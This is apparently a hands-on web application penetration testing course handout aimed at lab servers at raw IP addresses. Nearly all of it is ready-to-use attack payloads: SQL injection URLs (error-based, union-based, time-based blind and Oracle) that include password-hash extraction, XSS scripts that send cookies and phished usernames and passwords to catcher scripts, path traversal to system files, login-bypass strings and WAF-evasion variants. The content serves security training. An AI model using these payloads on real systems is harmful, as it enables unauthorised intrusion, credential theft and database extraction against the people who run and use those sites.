###########################
# Slides for today's talk #
###########################
https://s3.amazonaws.com/StrategicSec-Files/WebAppSecIsNotEasyButCanBeSimple.pptx


########################################
# Manual Web Application Testing Day 1 #
########################################

This is the Day 1 morning video:
https://s3.amazonaws.com/StrategicSec-Videos/_2015_8_13_rec-hq-1_279540_recording.mp4

This is the Day 1 afternoon video:
https://s3.amazonaws.com/StrategicSec-Videos/_2015_8_13_rec-hq-8_279678_recording.mp4

The basics of web app pentesting

Start with simple firefox addons:

- ShowIP			https://addons.mozilla.org/en-US/firefox/addon/showip/
- Server Spy			https://addons.mozilla.org/en-US/firefox/addon/server-spy/
- FoxyProxy			https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
- Tamper Data			https://addons.mozilla.org/en-US/firefox/addon/tamper-data/

A good list of web app testing add ons for Firefox:
https://addons.mozilla.org/en-us/firefox/collections/adammuntner/webappsec/


##################################
# Basic: Web Application Testing #
##################################

The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
	
	1. Does the website talk to a DB?
		- Look for parameter passing (ex: site.com/page.php?id=4)
		- If yes - try SQL Injection

	2. Can I or someone else see what I type?
		- If yes - try XSS

	3. Does the page reference a file?
		- If yes - try LFI/RFI

Let's start with some manual testing against 54.149.82.150


Start here:
http://54.149.82.150/


There's no parameter passing on the home page so the answer to question 1 is NO.
There is however a search box in the top right of the webpage, so the answer to question 2 is YES.

Try an XSS in the search box on the home page:
<script>alert(123);</script>

Doing this gives us the following in the address bar:
http://54.149.82.150/BasicSearch.aspx?Word=<script>alert(123);</script>

Ok, so we've verified that there is XSS in the search box. 

Let's move on to the search box in the left of the page.

Let's give the newsletter signup box a shot

Moving on to the login page.
http://54.149.82.150/login.aspx

I entered a single quote (') for both the user name and the password. I got the following error:

-----------------------------------------------------------------
 'Users//User[@Name=''' and @Password=''']' has an invalid token.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Xml.XPath.XPathException: 'Users//User[@Name=''' and @Password=''']' has an invalid token.

Source Error:


Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");
Line 113:            string credential = "Users//User[@Name='" + UserName + "' and @Password='" + Password + "']";
Line 114:            XmlNodeList xmln = doc.SelectNodes(credential);
Line 115:            //String test = xmln.ToString();            
Line 116:            if (xmln.Count > 0)

-----------------------------------------------------------------


Hmm....System.Xml.XPath.XPathException.....that's not SQL.

WTF is this:
Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");




In this case you'll have the trap the request with a proxy like:
- Firefox Tamper Data
- Burp Suite				http://www.portswigger.net/Burp/proxy.html
- WebScarab				https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project
- Rat Proxy				https://code.google.com/p/ratproxy/
- Zap Proxy				https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
- Paros					http://sourceforge.net/projects/paros/



Let's go back to that page error message.....


Let's check it out:
http://54.149.82.150/AuthInfo.xml

Looks like we found passwords!!!!!!!!!!


Looks like there no significant new functionality after logging in with the stolen credentials.

Going back to the homepage...let's see if we can see anything. Figured I'd click on one of the links


http://54.149.82.150/bookdetail.aspx?id=2


Ok, there is parameter passing (bookdetail.aspx?id=2).

The page name is:		bookdetail.aspx
The parameter name is:		id
The paramber value is:		2


Let's try throwing a single quote (') in there:

http://54.149.82.150/bookdetail.aspx?id=2'


I get the following error:

Unclosed quotation mark after the character string ''.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.










#############################################################################
# SQL Injection                                                             #
# https://s3.amazonaws.com/StrategicSec-Files/1-Intro_To_SQL_Intection.pptx #
#############################################################################


- Another quick way to test for SQLI is to remove the paramter value

 
#############################
# Error-Based SQL Injection #
#############################
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))-- 	NOTE: "N" - just means to keep going until you run out of databases
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--




#############################
# Union-Based SQL Injection #
#############################
http://54.149.82.150/bookdetail.aspx?id=2 order by 100--
http://54.149.82.150/bookdetail.aspx?id=2 order by 50--
http://54.149.82.150/bookdetail.aspx?id=2 order by 25--
http://54.149.82.150/bookdetail.aspx?id=2 order by 10--
http://54.149.82.150/bookdetail.aspx?id=2 order by 5--
http://54.149.82.150/bookdetail.aspx?id=2 order by 6--
http://54.149.82.150/bookdetail.aspx?id=2 order by 7--
http://54.149.82.150/bookdetail.aspx?id=2 order by 8--
http://54.149.82.150/bookdetail.aspx?id=2 order by 9--
http://54.149.82.150/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--

	We are using a union select statement because we are joining the developer's query with one of our own.
	Reference: 
	http://www.techonthenet.com/sql/union.php
	The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements. 
	It removes duplicate rows between the various SELECT statements.

	Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.

http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--

	Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.

http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--





- Another way is to see if you can get the backend to perform an arithmetic function
http://54.149.82.150/bookdetail.aspx?id=(2)	
http://54.149.82.150/bookdetail.aspx?id=(4-2)	
http://54.149.82.150/bookdetail.aspx?id=(4-1)



http://54.149.82.150/bookdetail.aspx?id=2 or 1=1-- 
http://54.149.82.150/bookdetail.aspx?id=2 or 1=2-- 
http://54.149.82.150/bookdetail.aspx?id=1*1 
http://54.149.82.150/bookdetail.aspx?id=2 or 1 >-1# 
http://54.149.82.150/bookdetail.aspx?id=2 or 1<99# 
http://54.149.82.150/bookdetail.aspx?id=2 or 1<>1# 
http://54.149.82.150/bookdetail.aspx?id=2 or 2 != 3-- 
http://54.149.82.150/bookdetail.aspx?id=2 &0#





###############################
# Blind SQL Injection Testing #
###############################
Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
  	 
3 - Total Characters
http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 		(Ok, the username is 3 chars long - it waited 10 seconds)

Let's go for a quick check to see if it's DBO
http://54.149.82.150/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--

Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.

D  - 1st Character
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'-- 	
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- 	(Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
 
B - 2nd Character
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
 
O - 3rd Character
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds










###################################################################
# What is XSS                                                     #
# https://s3.amazonaws.com/StrategicSec-Files/2-Intro_To_XSS.pptx #
###################################################################

OK - what is Cross Site Scripting (XSS)

1. Use Firefox to browse to the following location:

	http://54.186.248.116/xss_practice/

	A really simple search page that is vulnerable should come up. 




2. In the search box type:
	
	<script>alert('So this is XSS')</script>


	This should pop-up an alert window with your message in it proving XSS is in fact possible.
	Ok, click OK and then click back and go back to http://54.186.248.116/xss_practice/


3. In the search box type:
	
	<script>alert(document.cookie)</script>


	This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
	Ok, click OK and then click back and go back to http://54.186.248.116/xss_practice/

4. Now replace that alert script with:

	<script>document.location="http://54.186.248.116/xss_practice/cookie_catcher.php?c="+document.cookie</script> 


This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.


5. Now view the stolen cookie at:
	http://54.186.248.116/xss_practice/cookie_stealer_logs.html


The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.






############################
# A Better Way To Demo XSS #
############################


Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.


Use Firefox to browse to the following location:

	http://54.186.248.116/xss_practice/



Paste this in the search box
----------------------------


Option 1
--------

<script>
password=prompt('Your session is expired. Please enter your password to continue',' '); 
document.write("<img src=\"http://54.186.248.116/xss_practice/passwordgrabber.php?password=" +password+"\">");
</script>


Now view the stolen cookie at:
	http://54.186.248.116/xss_practice/passwords.html



Option 2
--------
<script>
username=prompt('Please enter your username',' ');
password=prompt('Please enter your password',' ');
document.write("<img src=\"http://54.186.248.116/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
</script>




Now view the stolen cookie at:
http://54.186.248.116/xss_practice/username_password_logs.html




#########################################
# Let's kick it up a notch with ASP.NET #
# http://54.200.178.220/                #
#########################################


The trading Web App is on http://54.200.178.220/


Try the following in the search box:
	<script>alert(123);</script>
	' or 1=1
	' and a=a
	1=1
	Joe'+OR+1=1;--


	<script>alert(123);</script>
	
Open a new tab in firefox and try this:
	http://54.200.178.220/Searchresult.aspx?<script>alert(123);</script>=ScriptName


Try the contact us form.
Open a new tab in firefox and try this:
	http://54.200.178.220/OpenPage.aspx?filename=../../../../../../windows/win.ini

Try this on the inquiry form:
	Joe McCray
	1234567890
	joe@strategicsec.com') waitfor delay '00:00:10'--


Login Box:

	' or 1=1 or ''='
	anything   			(click login instead of pressing enter)



Tamper Data: (notice 2 session IDs)

	AcmeTrading=a4b796687b846dd4a34931d708c62b49; 		SessionID is md5
	IsAdmin=yes; 
	ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45



Profile - Detail	(tamper data)
	Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
	joe|set


	xss_upload.txt (Upload Bulk Order)
	<script>alert(123);</script>




############################
# Trading Web App with WAF #
# http://54.213.131.105    #
############################


Try the following in the search box:
	<script>alert(123);</script>
	<script>alert(123);</script
	<script>alert(123)
	<script>alert
	<script>
	<script
	<scrip
	<scri
	<scr
	<sc
	<s
	<p
	<
	< s
	Joe'+OR+1=1;--

	
Open a new tab in firefox and try this:
	http://54.213.131.105/Searchresult.aspx?%u003cscript>prompt(123)%u003c/script>=ScriptName


	xss_upload.txt (Upload Bulk Order)
	<script>alert(123);</script>


Login Box:

	' or 1=1 or ''='
	anything



Tamper Data: (notice 2 session IDs)

	AcmeTrading=a4b796687b846dd4a34931d708c62b49; 		SessionID is md5
	IsAdmin=yes; 
	ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45



Profile - Detail	(tamper data)
	Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
	joe|set







###########################################################
# Attacking an Oracle/JSP based WebApp with SQL Injection #
###########################################################





http://54.69.156.253:8081/bookcompany/


user:	a' OR 'a'='a
pass:	a' OR 'a'='a







http://54.69.156.253:8081/bookcompany/author.jsp?id=111


[ Search by Username ]	Joe' OR 'a'='a












http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1



http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' OR '1'='1















http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--


Host is running:





http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT user FROM dual))--

User is:





http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name))--

Current database is: